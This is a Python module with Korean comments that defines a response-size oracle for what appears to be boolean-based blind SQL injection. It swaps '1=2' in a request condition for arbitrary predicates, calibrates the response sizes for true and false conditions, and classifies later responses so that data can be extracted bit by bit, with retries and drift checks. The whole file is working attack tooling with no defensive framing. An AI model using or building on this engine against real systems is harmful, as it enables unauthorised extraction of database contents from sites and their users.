"""반복 측정한 응답 크기로 참·거짓을 판별한다."""


class ExecutionError(ValueError):
    pass


class SizeOracle:
    SAMPLE_COUNT = 5
    ATTEMPTS = 3
    CHECK_INTERVAL = 50

    def __init__(self, client, threshold):
        self.client = client
        self.threshold = threshold
        self.ranges = {}
        self.checks = 0

    def size(self, predicate):
        condition = self.client.request.condition.replace("1=2", predicate)
        return self.client.size(condition)

    def calibrate(self):
        samples = {False: [], True: []}
        # 번갈아 측정해 시간에 따른 페이지 변동도 표본에 포함한다.
        for _ in range(self.SAMPLE_COUNT):
            for truth in (False, True):
                samples[truth].append(self.size("1=1" if truth else "1=2"))
        observed = {truth: (min(values), max(values)) for truth, values in samples.items()}
        for truth in (False, True):
            low, high = observed[truth]
            print(f"{'참' if truth else '거짓'} 응답: {low}~{high} bytes (5회 측정)")
        lower, upper = sorted(observed, key=lambda truth: observed[truth][0])
        gap = observed[upper][0] - observed[lower][1]
        # 관측 변동 폭만큼 여유를 주되, 고정 응답에도 1바이트 여유를 둔다.
        for truth, (low, high) in observed.items():
            padding = max(1, high - low)
            self.ranges[truth] = (max(0, low - padding), high + padding)
        if gap <= self.threshold or self.ranges[lower][1] >= self.ranges[upper][0]:
            raise ExecutionError(
                "참·거짓 응답을 안정적으로 구분할 수 없습니다. "
                "응답 크기 범위·변동 폭과 --threshold를 확인하세요."
            )
        print(f"판별 방향: 참 응답이 더 {'큼' if upper else '짧음'}")
        for truth in (False, True):
            low, high = self.ranges[truth]
            print(f"{'참' if truth else '거짓'} 허용 범위: {low}~{high} bytes")
        print("범위 밖 응답은 최대 3회 측정 후 중단합니다.")

    def classify(self, size):
        for truth, (low, high) in self.ranges.items():
            if low <= size <= high:
                return truth
        return None

    def verify(self):
        # 기준이 달라져도 자동 재학습하지 않는다. 앞선 추출의 신뢰성이 깨질 수 있다.
        for truth in (False, True):
            for _ in range(self.ATTEMPTS):
                result = self.classify(self.size("1=1" if truth else "1=2"))
                if result is truth:
                    break
                if result is not None:
                    raise ExecutionError("참·거짓 기준이 변경되었습니다. 세션·페이지를 확인하세요.")
            else:
                raise ExecutionError("기준 응답 크기가 허용 범위를 벗어났습니다. 실행을 중단합니다.")
        self.checks = 0

    def check(self, predicate):
        if not self.ranges:
            raise ExecutionError("응답 크기 측정이 필요합니다.")
        if self.checks >= self.CHECK_INTERVAL:
            self.verify()
        for _ in range(self.ATTEMPTS):
            size = self.size(predicate)
            result = self.classify(size)
            if result is not None:
                self.checks += 1
                return result
        raise ExecutionError(
            f"응답 크기 {size} bytes를 참·거짓으로 판별할 수 없습니다. "
            "3회 측정 후 실행을 중단합니다."
        )
